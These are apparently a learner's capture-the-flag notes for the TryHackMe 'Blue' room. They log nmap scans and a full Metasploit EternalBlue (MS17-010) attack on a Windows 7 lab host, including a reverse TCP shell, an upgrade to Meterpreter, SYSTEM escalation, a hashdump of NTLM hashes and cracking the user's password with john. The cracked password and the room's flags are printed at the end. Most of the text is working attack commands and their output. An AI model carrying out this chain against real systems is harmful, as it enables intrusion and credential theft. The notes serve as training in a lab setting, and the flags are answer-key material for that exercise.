$ nmap -sC -sV -p- 10.10.14.78         
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-29 17:53 EST
Stats: 0:01:28 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 33.33% done; ETC: 17:56 (0:01:28 remaining)
Nmap scan report for 10.10.14.78
Host is up (0.020s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2022-01-29T22:55:54+00:00
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2022-01-28T22:52:41
|_Not valid after:  2022-07-30T22:52:41
|_ssl-date: 2022-01-29T22:55:59+00:00; 0s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h12m00s, deviation: 2h41m00s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:5d:79:61:e0:87 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-01-29T16:55:54-06:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-29T22:55:54
|_  start_date: 2022-01-29T22:52:40

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.69 seconds

#this is the scan to look for vulnerabilities 
(kali㉿kali)-[~/THM/practice/kenobi]
└─$ nmap -sV --script vuln <ip>
--> using the hint in the room I googled shadowbrokers + smbv1 and found the article:
https://isc.sans.edu/forums/diary/ETERNALBLUE+Windows+SMBv1+Exploit+Patched/22304/
--> exploit is called ETERNALBLUE (name of room) and was patched with MS17-010






--> I then started up msfconsole, and executed:
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

--> next I 'used' the exploit by executing the following:
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >

--> then I needed to show some options so I did the following:
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/ra
                                             pid7/metasploit-framework/wiki/Using-Metasplo
                                             it
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for auth
                                             entication. Only affects Windows Server 2008
                                             R2, Windows 7, Windows Embedded Standard 7 ta
                                             rget machines.
   SMBPass                         no        (Optional) The password for the specified use
                                             rname
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit
                                             Target. Only affects Windows Server 2008 R2,
                                             Windows 7, Windows Embedded Standard 7 target
                                              machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. On
                                             ly affects Windows Server 2008 R2, Windows 7,
                                              Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process
                                        , none)
   LHOST     192.168.251.131  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target




--> RHOSTS is the required value and is the target host IP (I assume) so I needed to set this:
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.14.78
RHOST => 10.10.14.78

--> other, final, thing I had to do was to specify the paylaod:
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp


-->after both of these variables have been set the next step is to run the exploit!:
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.251.131:4444 
[*] 10.10.14.78:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.14.78:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.14.78:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.14.78:445 - The target is vulnerable.
[*] 10.10.14.78:445 - Connecting to target for exploitation.
[+] 10.10.14.78:445 - Connection established for exploitation.
[+] 10.10.14.78:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.14.78:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.14.78:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.14.78:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.14.78:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.14.78:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.14.78:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.14.78:445 - Sending all but last fragment of exploit packet
[*] 10.10.14.78:445 - Starting non-paged pool grooming
[+] 10.10.14.78:445 - Sending SMBv2 buffers
[+] 10.10.14.78:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.14.78:445 - Sending final SMBv2 buffers.
[*] 10.10.14.78:445 - Sending last fragment of exploit packet!
[*] 10.10.14.78:445 - Receiving response from exploit packet
[+] 10.10.14.78:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.14.78:445 - Sending egg to corrupted connection.
[*] 10.10.14.78:445 - Triggering free of corrupted buffer.
[-] 10.10.14.78:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.14.78:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.14.78:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.14.78:445 - Connecting to target for exploitation.
[+] 10.10.14.78:445 - Connection established for exploitation.
[+] 10.10.14.78:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.14.78:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.14.78:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.14.78:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.14.78:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.14.78:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.14.78:445 - Trying exploit with 17 Groom Allocations.
[*] 10.10.14.78:445 - Sending all but last fragment of exploit packet
[*] 10.10.14.78:445 - Starting non-paged pool grooming
[+] 10.10.14.78:445 - Sending SMBv2 buffers
[+] 10.10.14.78:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.14.78:445 - Sending final SMBv2 buffers.
[*] 10.10.14.78:445 - Sending last fragment of exploit packet!
[*] 10.10.14.78:445 - Receiving response from exploit packet
[+] 10.10.14.78:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.14.78:445 - Sending egg to corrupted connection.
[*] 10.10.14.78:445 - Triggering free of corrupted buffer.
[-] 10.10.14.78:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.14.78:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.14.78:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.10.14.78:445 - Connecting to target for exploitation.
[+] 10.10.14.78:445 - Connection established for exploitation.
[+] 10.10.14.78:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.14.78:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.14.78:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.14.78:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.14.78:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.14.78:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.14.78:445 - Trying exploit with 22 Groom Allocations.
[*] 10.10.14.78:445 - Sending all but last fragment of exploit packet
[*] 10.10.14.78:445 - Starting non-paged pool grooming
[+] 10.10.14.78:445 - Sending SMBv2 buffers
[+] 10.10.14.78:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.14.78:445 - Sending final SMBv2 buffers.
[*] 10.10.14.78:445 - Sending last fragment of exploit packet!
[*] 10.10.14.78:445 - Receiving response from exploit packet
[+] 10.10.14.78:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.14.78:445 - Sending egg to corrupted connection.
[*] 10.10.14.78:445 - Triggering free of corrupted buffer.
[-] 10.10.14.78:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.14.78:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.10.14.78:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Exploit completed, but no session was created.

-->clerly did not work so I had to try again, but also did not work so decided to restart the target machine
-->(as the room indicated)
--> this time it worked! so I suspended the shell to the background and continued with the tasks
msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter
Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

--> next is to use this to get a meterpreter rather than the currently unstable shell
msf6 exploit(windows/smb/ms17_010_eternalblue) > use 0
[*] Using configured payload windows/x64/shell/reverse_tcp
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the conne
                                       ction
   LHOST                     no        IP of host that will receive the connection from th
                                       e payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

--> session is a rewuired setting which we must change:
msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type               Information  Connection
  --  ----  ----               -----------  ----------
  1         shell x64/windows               10.11.59.68:4444 -> 10.10.200.63:49177 (10.10.
                                            200.63) 

--> not sure how to set the session just identified but I looked it up and found:
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1

--> next is to run the exlpoit, hoping it will work:
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.11.59.68:4433 
[*] Post module execution completed

--> it did, but me being inexperienced thought something was wrong as I was not immediately put into the meterpreter
--> I therefore reran the exploit and had to wait ages for ANOTHER sommand stager process
        --> likely ruined the one I had already made

--> after this finishes I will run "sessions -l" again to see which sesison it is and then use 'jump into' this process using "session -i <session_id>":
 msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information               Connection
  --  ----  ----                     -----------               ----------
  1         shell x64/windows                                  10.11.59.68:4444 -> 10.10
                                                               .200.63:49177 (10.10.200.
                                                               63)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JO  10.11.59.68:4433 -> 10.10
                                     N-PC                      .200.63:49211 (10.10.200.
                                                               63)
msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter >


--> we got the meterpreter! next up:
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > ps

Process List
============

 PID   PPID  Name                Arch  Session  User                          Path
 ---   ----  ----                ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System              x64   0
 416   4     smss.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 428   712   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 488   712   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 568   556   csrss.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 616   608   csrss.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 624   556   wininit.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 664   608   winlogon.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 712   624   services.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 720   624   lsass.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 728   624   lsm.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 836   712   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 904   712   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 928   2936  powershell.exe      x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShel
                                                                              l\v1.0\powershell.exe
 952   712   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1020  664   LogonUI.exe         x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 1084  712   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1164  712   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1344  712   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1408  712   amazon-ssm-agent.e  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-s
             xe                                                               sm-agent.exe
 1484  712   LiteAgent.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\Lit
                                                                              eAgent.exe
 1620  712   Ec2Config.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigSer
                                                                              vice\Ec2Config.exe
 1660  712   svchost.exe         x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1924  568   conhost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 1944  712   TrustedInstaller.e  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstalle
             xe                                                               r.exe
 1956  712   svchost.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2096  836   WmiPrvSE.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.ex
                                                                              e
 2472  712   sppsvc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
2520  3068  powershell.exe      x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShel
                                                                              l\v1.0\powershell.exe
 2580  712   svchost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2624  712   vds.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 2772  568   conhost.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2788  712   SearchIndexer.exe   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.ex
                                                                              e
 2844  712   spoolsv.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2904  2844  cmd.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 3068  2904  cmd.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe


--> alot of processes are running NT AUTHORITY\SYSTEM, but I believe the one we are out for is powershell.exe - 2520:
meterpreter > migrate 2520
[*] Migrating from 928 to 2520...
[*] Migration completed successfully.

--> worked on first try! Next is to get a hashdump (for passwords):
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

--> we got the hash for the user jon so next is to crack it! I will be using john for this:
(kali㉿kali)-[~/THM/practice/blue]
└─$ cat admin.hash 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

(kali㉿kali)-[~/THM/practice/blue]
└─$ mv admin.hash jon.hash

(kali㉿kali)-[~/THM/practice/blue]
└─$ john jon.hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt                                       1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)
1g 0:00:00:00 DONE (2022-01-29 19:48) 1.818g/s 18546Kp/s 18546Kc/s 18546KC/s alr19882006..alpusidi
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed

--> we got the password! (alqfna22)






--> flag1.txt could be found in cd .. x2
flag{access_the_machine}
--> flag2.txt could be found in \Users\Jon
flag{sam_database_elevated_access}
--> flag3.txt could be found in \Windows\System32\Config
flag{admin_documents_can_be_valuable}